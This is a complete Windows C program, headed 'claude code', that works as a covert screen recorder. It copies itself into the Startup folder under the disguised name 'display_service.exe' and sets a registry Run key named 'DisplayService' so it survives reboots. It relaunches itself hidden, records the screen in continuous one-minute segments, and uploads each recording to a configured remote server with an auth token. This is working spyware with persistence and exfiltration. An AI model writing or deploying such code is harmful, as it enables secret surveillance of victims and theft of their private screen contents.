// claude code
#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "shell32.lib")

// ─── CONFIG ───────────────────────────────────────────────────────────────────
#define RECORD_SECONDS   60       // Duration of each recording segment
#define FPS              5        // Frames per second
#define EXE_NAME         "display_service.exe"   // Name used in startup folder
#define CFG_NAME         "recorder.cfg"
#define RECORDINGS_DIR   "Recordings"            // Subfolder inside startup folder
// ──────────────────────────────────────────────────────────────────────────────

typedef struct {
    char upload_url[512];   // HTTP upload URL  (leave blank to skip)
    char auth_token[256];   // Auth token       (leave blank if not needed)
} Config;

// ─────────────────────────────────────────────────────────────────────────────
// PATH HELPERS
// ─────────────────────────────────────────────────────────────────────────────

// Get full path of currently running .exe
void get_exe_path(char *buf, size_t size) {
    GetModuleFileName(NULL, buf, (DWORD)size);
}

// Get folder of currently running .exe
void get_exe_dir(char *buf, size_t size) {
    get_exe_path(buf, size);
    char *slash = strrchr(buf, '\\');
    if (slash) *slash = '\0';
}

// Get Windows startup folder path for current user:
// C:\Users\<name>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
void get_startup_folder(char *buf, size_t size) {
    SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, buf);
}

// Build path to our installed .exe inside startup folder
void get_installed_exe(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, EXE_NAME);
}

// Build path to recordings subfolder inside startup folder
void get_recordings_dir(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, RECORDINGS_DIR);
}

// Build path to config file inside startup folder
void get_installed_cfg(char *buf, size_t size) {
    char startup[MAX_PATH] = {0};
    get_startup_folder(startup, sizeof(startup));
    snprintf(buf, size, "%s\\%s", startup, CFG_NAME);
}

// ─────────────────────────────────────────────────────────────────────────────
// SELF-INSTALL
// ─────────────────────────────────────────────────────────────────────────────

// Returns 1 if this process is already running from the startup folder
int is_running_from_startup() {
    char exe_path[MAX_PATH] = {0};
    char installed[MAX_PATH] = {0};
    get_exe_path(exe_path, sizeof(exe_path));
    get_installed_exe(installed, sizeof(installed));

    // Case-insensitive compare
    return (_stricmp(exe_path, installed) == 0);
}

// Copy self + config to startup folder, add registry run key, then relaunch
void self_install() {
    char startup[MAX_PATH]      = {0};
    char exe_src[MAX_PATH]      = {0};
    char exe_dst[MAX_PATH]      = {0};
    char cfg_src[MAX_PATH]      = {0};
    char cfg_dst[MAX_PATH]      = {0};
    char rec_dir[MAX_PATH]      = {0};

    get_startup_folder(startup, sizeof(startup));
    get_exe_path(exe_src, sizeof(exe_src));
    get_installed_exe(exe_dst, sizeof(exe_dst));
    get_recordings_dir(rec_dir, sizeof(rec_dir));
    get_installed_cfg(cfg_dst, sizeof(cfg_dst));

    // Get config path next to current exe
    char exe_dir[MAX_PATH] = {0};
    get_exe_dir(exe_dir, sizeof(exe_dir));
    snprintf(cfg_src, sizeof(cfg_src), "%s\\%s", exe_dir, CFG_NAME);

    // 1. Create recordings folder
    CreateDirectory(rec_dir, NULL);

    // 2. Copy exe to startup folder (overwrite if already there)
    CopyFile(exe_src, exe_dst, FALSE);

    // 3. Copy config if it exists next to the source exe
    if (GetFileAttributes(cfg_src) != INVALID_FILE_ATTRIBUTES) {
        CopyFile(cfg_src, cfg_dst, FALSE);
    } else {
        // Create a blank default config in startup folder
        FILE *f = fopen(cfg_dst, "w");
        if (f) {
            fprintf(f, "# Screen Recorder Config\n");
            fprintf(f, "# Set upload_url to send recordings to your HTTP server\n");
            fprintf(f, "# Leave blank to only save locally (in Recordings folder)\n\n");
            fprintf(f, "upload_url=\n");
            fprintf(f, "auth_token=\n");
            fclose(f);
        }
    }

    // 4. Add registry key so it runs on every boot
    //    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    HKEY hkey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                     0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegSetValueEx(hkey, "DisplayService", 0, REG_SZ,
                      (BYTE*)exe_dst, (DWORD)(strlen(exe_dst) + 1));
        RegCloseKey(hkey);
    }

    // 5. Relaunch from startup folder and exit current instance
    ShellExecute(NULL, "open", exe_dst, NULL, startup, SW_HIDE);
    ExitProcess(0);
}

// ─────────────────────────────────────────────────────────────────────────────
// CONFIG
// ─────────────────────────────────────────────────────────────────────────────

void read_config(Config *cfg) {
    char cfg_path[MAX_PATH] = {0};
    get_installed_cfg(cfg_path, sizeof(cfg_path));

    FILE *f = fopen(cfg_path, "r");
    if (!f) return;

    char line[768];
    while (fgets(line, sizeof(line), f)) {
        line[strcspn(line, "\r\n")] = 0;
        if (line[0] == '#' || line[0] == '\0') continue;
        if (strncmp(line, "upload_url=", 11) == 0)
            strncpy(cfg->upload_url, line + 11, sizeof(cfg->upload_url) - 1);
        else if (strncmp(line, "auth_token=", 11) == 0)
            strncpy(cfg->auth_token, line + 11, sizeof(cfg->auth_token) - 1);
    }
    fclose(f);
}

// ─────────────────────────────────────────────────────────────────────────────
// SCREEN CAPTURE
// ─────────────────────────────────────────────────────────────────────────────

BYTE* capture_frame(int *out_w, int *out_h) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    *out_w = w; *out_h = h;

    HDC screen_dc = GetDC(NULL);
    HDC mem_dc    = CreateCompatibleDC(screen_dc);
    HBITMAP hbmp  = CreateCompatibleBitmap(screen_dc, w, h);
    SelectObject(mem_dc, hbmp);
    BitBlt(mem_dc, 0, 0, w, h, screen_dc, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = h;
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;

    int row_size = ((w * 3 + 3) & ~3);
    BYTE *pixels = (BYTE*)malloc(row_size * h);
    GetDIBits(mem_dc, hbmp, 0, h, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);

    DeleteObject(hbmp);
    DeleteDC(mem_dc);
    ReleaseDC(NULL, screen_dc);
    return pixels;
}

void record_segment(const char *filepath) {
    int fps          = FPS;              // local var so we can take its address
    int total_frames = RECORD_SECONDS * fps;
    int delay_ms     = 1000 / fps;

    FILE *f = fopen(filepath, "wb");
    if (!f) return;

    fwrite("SREC", 4, 1, f);
    fwrite(&fps,          sizeof(int), 1, f);
    fwrite(&total_frames, sizeof(int), 1, f);

    for (int i = 0; i < total_frames; i++) {
        int w, h;
        BYTE *pixels  = capture_frame(&w, &h);
        int row_size  = ((w * 3 + 3) & ~3);
        int data_size = row_size * h;

        fwrite(&w,         sizeof(int), 1, f);
        fwrite(&h,         sizeof(int), 1, f);
        fwrite(&data_size, sizeof(int), 1, f);
        fwrite(pixels,     data_size,   1, f);

        free(pixels);
        Sleep(delay_ms);
    }

    fclose(f);
}

// ─────────────────────────────────────────────────────────────────────────────
// HTTP UPLOAD
// ─────────────────────────────────────────────────────────────────────────────

int upload_file(const char *filepath, const Config *cfg) {
    if (cfg->upload_url[0] == '\0') return 1;

    URL_COMPONENTS uc = {0};
    uc.dwStructSize     = sizeof(uc);
    char host[256] = {0}, path[512] = {0};
    uc.lpszHostName     = host;
    uc.dwHostNameLength = sizeof(host);
    uc.lpszUrlPath      = path;
    uc.dwUrlPathLength  = sizeof(path);

    if (!InternetCrackUrl(cfg->upload_url, 0, 0, &uc)) return 0;

    HINTERNET hNet = InternetOpen("ScreenRecorder/1.0",
                                   INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hNet) return 0;

    HINTERNET hConn = InternetConnect(hNet, host, uc.nPort,
                                       NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConn) { InternetCloseHandle(hNet); return 0; }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE;
    if (uc.nScheme == INTERNET_SCHEME_HTTPS) flags |= INTERNET_FLAG_SECURE;

    HINTERNET hReq = HttpOpenRequest(hConn, "POST", path,
                                      NULL, NULL, NULL, flags, 0);
    if (!hReq) {
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return 0;
    }

    char boundary[] = "----SRecBoundary7349";
    char head[512], tail[128];
    const char *fname = strrchr(filepath, '\\');
    fname = fname ? fname + 1 : filepath;

    snprintf(head, sizeof(head),
        "--%s\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n",
        boundary, fname);
    snprintf(tail, sizeof(tail), "\r\n--%s--\r\n", boundary);

    FILE *f = fopen(filepath, "rb");
    if (!f) {
        InternetCloseHandle(hReq);
        InternetCloseHandle(hConn);
        InternetCloseHandle(hNet);
        return 0;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    rewind(f);
    BYTE *fbuf = (BYTE*)malloc(fsize);
    fread(fbuf, 1, fsize, f);
    fclose(f);

    DWORD total_size = (DWORD)(strlen(head) + fsize + strlen(tail));

    char content_type[128], extra_headers[512] = {0};
    snprintf(content_type, sizeof(content_type),
             "Content-Type: multipart/form-data; boundary=%s\r\n", boundary);
    if (cfg->auth_token[0])
        snprintf(extra_headers, sizeof(extra_headers),
                 "Authorization: Bearer %s\r\n", cfg->auth_token);

    char all_headers[640];
    snprintf(all_headers, sizeof(all_headers), "%s%s", content_type, extra_headers);

    BYTE *body = (BYTE*)malloc(total_size);
    DWORD offset = 0;
    memcpy(body + offset, head, strlen(head)); offset += (DWORD)strlen(head);
    memcpy(body + offset, fbuf, fsize);        offset += fsize;
    memcpy(body + offset, tail, strlen(tail));
    free(fbuf);

    BOOL ok = HttpSendRequest(hReq, all_headers, (DWORD)strlen(all_headers),
                               body, total_size);
    free(body);

    InternetCloseHandle(hReq);
    InternetCloseHandle(hConn);
    InternetCloseHandle(hNet);
    return ok ? 1 : 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// FILENAME
// ─────────────────────────────────────────────────────────────────────────────

void make_filename(char *buf, size_t size) {
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    snprintf(buf, size, "rec_%04d%02d%02d_%02d%02d%02d.srec",
             tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
             tm->tm_hour, tm->tm_min, tm->tm_sec);
}

// ─────────────────────────────────────────────────────────────────────────────
// ENTRY POINT
// ─────────────────────────────────────────────────────────────────────────────

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {

    // ── STEP 1: Self-install if not already running from startup folder ────────
    if (!is_running_from_startup()) {
        self_install(); // copies itself, adds registry key, relaunches, exits
        return 0;       // never reached — self_install calls ExitProcess
    }

    // ── STEP 2: Now running from startup folder — wait for boot to settle ─────
    Sleep(5000);

    // ── STEP 3: Load config ───────────────────────────────────────────────────
    Config cfg = {0};
    read_config(&cfg);

    // ── STEP 4: Get recordings folder path ────────────────────────────────────
    char rec_dir[MAX_PATH] = {0};
    get_recordings_dir(rec_dir, sizeof(rec_dir));
    CreateDirectory(rec_dir, NULL); // ensure it exists

    // ── STEP 5: Record loop ───────────────────────────────────────────────────
    while (1) {
        char filename[64];
        make_filename(filename, sizeof(filename));

        // Save recording directly into Recordings subfolder
        char rec_path[MAX_PATH] = {0};
        snprintf(rec_path, sizeof(rec_path), "%s\\%s", rec_dir, filename);

        // Record segment
        record_segment(rec_path);

        // Upload if configured (recording stays saved locally regardless)
        if (cfg.upload_url[0] != '\0') {
            upload_file(rec_path, &cfg);
        }

        // Note: we do NOT delete rec_path — recordings are kept locally always
    }

    return 0;
}
